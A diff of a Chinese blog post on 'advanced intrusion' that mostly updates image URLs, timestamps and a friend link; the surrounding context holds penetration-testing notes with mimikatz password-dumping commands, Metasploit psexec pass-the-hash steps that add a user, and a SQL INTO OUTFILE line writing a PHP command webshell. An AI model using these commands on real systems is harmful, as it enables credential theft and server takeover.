@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-04-23 21:33</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:18'>2018-04-23 21:33</time>
         
     </div>
     <div class="article-meta">
@@ -781,12 +783,12 @@
 <p>直接在系统上面运行上面与webshell下运行木马区别<br>在系统上运行木马是系统权限运行，在webshell下运行木马是以当前内置中间件权限运行</p>
 <p>中间件权限<br>1.菜刀进入右键<br>执行<br>whomai<br>得知自身权限<br>2.cd c:\www\<br>3.dir</p>
 <h3 id="本地管理员密码如何直接提取"><a href="#本地管理员密码如何直接提取" class="headerlink" title="本地管理员密码如何直接提取"></a>本地管理员密码如何直接提取</h3><p>1.直接通过mimikatz读取管理员密码（win7 winxp）<br>第一条 ：privilege::debug  //提升权限<br>第二条：sekurlsa::logonpa ssWords //抓取密码</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201801091859_724.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091859_724.png" alt=""></p>
 <p>2.webshell  </p>
 <p>3.<a href="http://www.4hou.com/tools/7404.html" target="_blank" rel="external">Lazagne-master</a></p>
-<p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="http://oy0tigw51.bkt.clouddn.com/201801091927_696.png" alt=""></p>
+<p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091927_696.png" alt=""></p>
 <p>use exploit/windows/smb/psexec<br>show option<br>set RHOST 192.168.1.109<br>set SMBUser administrator<br>set SMPass   (根目录下的pass.txt里的哈希值)<br>exploit<br>shell<br>net user<br>net user 123 123 / add</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201801091956_886.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801091957_230.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091956_886.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801091957_230.png" alt=""></p>
 <p>本地哈希破解<br>注意本地搜索sam 这个是目标机里的所有密码</p>
 <p>5.通过LC5暴力破解hash密码<br>使用gmer直接提取sam和sysytem文件或用pwdump7提取HASH 最后使用LC5破解</p>
 <p>6.使用Ophcrack（kali）破解系统hash密码</p>
@@ -794,9 +796,9 @@
 <h4 id="非cms获取webshell方法"><a href="#非cms获取webshell方法" class="headerlink" title="非cms获取webshell方法"></a>非cms获取webshell方法</h4><p>1.数据库备份获取<br>2.抓包上传获取<br>3.sql命令获取<br>4.模板修改获取<br>5.插入一句话获取<br>6.修改上传类型获取</p>
 <h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>PHPmyadmin获取</p>
 <pre><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]);echo \&#39;&lt;pre&gt;\&#39;;?&gt;&#39; into outfile &#39;E:/xamp/www/xioam.php&#39;
-</code></pre><p>php爆路径方法收集<br><img src="http://oy0tigw51.bkt.clouddn.com/201801092306_259.png" alt=""></p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201801092322_426.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092325_134.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092326_398.png" alt=""></p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201801092327_366.png" alt=""></p>
+</code></pre><p>php爆路径方法收集<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092306_259.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092322_426.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092325_134.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092326_398.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801092327_366.png" alt=""></p>
 <p>tomcat获取<br>weblogic获取<br>jboss获取</p>
 <h3 id="内网远程连接"><a href="#内网远程连接" class="headerlink" title="内网远程连接"></a>内网远程连接</h3><p>webshell如何开启3389</p>
 <p>服务器端口被修改如何查找</p>
@@ -820,7 +822,7 @@
     <p><span>文章字数:</span><span class="post-count">506</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-04-23, 21:33:14</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:18</p>
     <span>原始链接:</span><a class="post-url" href="/archives/1f382107/" title="高级入侵">http://mang0.me/archives/1f382107/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
